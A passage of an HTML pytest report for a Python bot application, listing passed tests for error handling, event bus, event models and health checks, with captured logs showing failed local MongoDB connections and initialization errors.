          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_error_handler_enhanced.py::TestErrorHandler::test_handle_subscription_service_error</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_error_handler_enhanced.py::TestErrorHandler::test_handle_narrative_service_error</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_error_handler_enhanced.py::TestErrorHandler::test_handle_coordinator_service_error</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_error_handler_enhanced.py::TestErrorHandler::test_handle_jwt_expired_signature_error</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_error_handler_enhanced.py::TestErrorHandler::test_handle_jwt_invalid_token_error</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_error_handler_enhanced.py::TestErrorHandler::test_handle_unknown_error_fallback</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_error_handler_enhanced.py::TestErrorHandler::test_handle_error_method</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_bus.py::test_event_bus_initialization</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] EventBus initialized with retry policy: max_retries=3, initial_delay=1.0s
2025-09-20 23:10:26 [info     ] EventBus initialized with retry policy: max_retries=3, initial_delay=1.0s
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_models.py::test_base_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_models.py::test_user_interaction_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_models.py::test_reaction_detected_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_models.py::test_decision_made_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_models.py::test_subscription_updated_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_models.py::test_besitos_awarded_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_models.py::test_narrative_hint_unlocked_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_models.py::test_vip_access_granted_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_models.py::test_user_deleted_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_models.py::test_update_received_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_models.py::test_create_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_models.py::test_create_event_invalid_type</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_processor.py::test_event_processor_initialization</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] EventProcessor initialized
2025-09-20 23:10:26 [info     ] EventProcessor initialized
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestMockEventBus::test_init</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestMockEventBus::test_connect</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestMockEventBus::test_publish</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestMockEventBus::test_publish_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestMockEventBus::test_subscribe</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestMockEventBus::test_subscribe_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestMockEventBus::test_health_check</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestMockEventBus::test_close</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestMockEventBus::test_reset</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestEventTestConfig::test_create_test_config_manager</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestEventTestConfig::test_set_test_env_vars</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestEventTestDataFactory::test_create_base_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestEventTestDataFactory::test_create_user_interaction_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestEventTestDataFactory::test_create_reaction_detected_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestEventTestDataFactory::test_create_decision_made_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestEventTestDataFactory::test_create_subscription_updated_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestEventTestDataFactory::test_create_test_event_payload</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestEventTestHelpers::test_create_async_mock_handler</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestEventTestHelpers::test_capture_event_payloads</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::TestEventTestContext::test_context_manager</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::test_mock_event_bus_fixture</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::test_event_test_config_fixture</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::test_event_test_data_factory_fixture</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_event_test_utils.py::test_event_test_helpers_fixture</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_events_module.py::test_events_module_structure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_events_module.py::test_event_constants</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_events_module.py::test_event_bus_config</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_health_manager.py::TestHealthCheckManager::test_health_check_manager_initialization</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] HealthCheckManager initialized
2025-09-20 23:10:26 [info     ] HealthCheckManager initialized
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_health_manager.py::TestHealthCheckManager::test_check_database_health</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] HealthCheckManager initialized
2025-09-20 23:10:26 [debug    ] Checking database health
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_health_manager.py::TestHealthCheckManager::test_check_event_bus_health</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] HealthCheckManager initialized
2025-09-20 23:10:26 [debug    ] Checking event bus health
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_health_manager.py::TestHealthCheckManager::test_check_all_health</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] HealthCheckManager initialized
2025-09-20 23:10:26 [debug    ] Performing comprehensive health check
2025-09-20 23:10:26 [debug    ] Checking database health
2025-09-20 23:10:26 [debug    ] Checking event bus health
2025-09-20 23:10:26 [debug    ] Comprehensive health check results: {&#x27;overall_status&#x27;: &#x27;healthy&#x27;, &#x27;timestamp&#x27;: 372557.595642265, &#x27;components&#x27;: {&#x27;database&#x27;: {&#x27;status&#x27;: &#x27;healthy&#x27;, &#x27;details&#x27;: {&#x27;mongodb&#x27;: True, &#x27;sqlite&#x27;: True}}, &#x27;event_bus&#x27;: {&#x27;status&#x27;: &#x27;healthy&#x27;, &#x27;details&#x27;: {&#x27;connected&#x27;: True, &#x27;redis_healthy&#x27;: True}}, &#x27;api_server&#x27;: {&#x27;status&#x27;: &#x27;unknown&#x27;, &#x27;details&#x27;: &#x27;API health check not implemented&#x27;}}}
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_health_manager.py::TestHealthCheckManager::test_check_database_health_with_no_manager</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] HealthCheckManager initialized
2025-09-20 23:10:26 [debug    ] Checking database health
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_health_manager.py::TestHealthCheckManager::test_check_event_bus_health_with_no_bus</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] HealthCheckManager initialized
2025-09-20 23:10:26 [debug    ] Checking event bus health
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_health_manager.py::TestHealthCheckManager::test_get_health_summary</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] HealthCheckManager initialized
2025-09-20 23:10:26 [debug    ] Performing comprehensive health check
2025-09-20 23:10:26 [debug    ] Checking database health
2025-09-20 23:10:26 [debug    ] Checking event bus health
2025-09-20 23:10:26 [debug    ] Comprehensive health check results: {&#x27;overall_status&#x27;: &#x27;healthy&#x27;, &#x27;timestamp&#x27;: 372557.605638509, &#x27;components&#x27;: {&#x27;database&#x27;: {&#x27;status&#x27;: &#x27;healthy&#x27;, &#x27;details&#x27;: {&#x27;mongodb&#x27;: True, &#x27;sqlite&#x27;: True}}, &#x27;event_bus&#x27;: {&#x27;status&#x27;: &#x27;healthy&#x27;, &#x27;details&#x27;: {&#x27;connected&#x27;: True, &#x27;redis_healthy&#x27;: True}}, &#x27;api_server&#x27;: {&#x27;status&#x27;: &#x27;unknown&#x27;, &#x27;details&#x27;: &#x27;API health check not implemented&#x27;}}}
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_integration.py::TestIntegration::test_bot_application_initialization</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] Initializing bot application
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_integration.py::TestIntegration::test_bot_application_start_success</td>
          <td class="col-duration">40.16</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf346288ed7674ef4ee91e, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf346888ed7674ef4ee91f, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf346f88ed7674ef4ee920, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf347888ed7674ef4ee921, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf348588ed7674ef4ee922, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_integration.py::TestIntegration::test_bot_application_start_failure</td>
          <td class="col-duration">40.16</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf348a88ed7674ef4ee923, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf349088ed7674ef4ee924, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf349788ed7674ef4ee925, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf34a088ed7674ef4ee926, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf34ad88ed7674ef4ee927, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize
ERROR    src.core.application:application.py:128 Failed to set up update receiving mode<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_integration.py::TestIntegration::test_bot_application_stop</td>
          <td class="col-duration">40.15</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
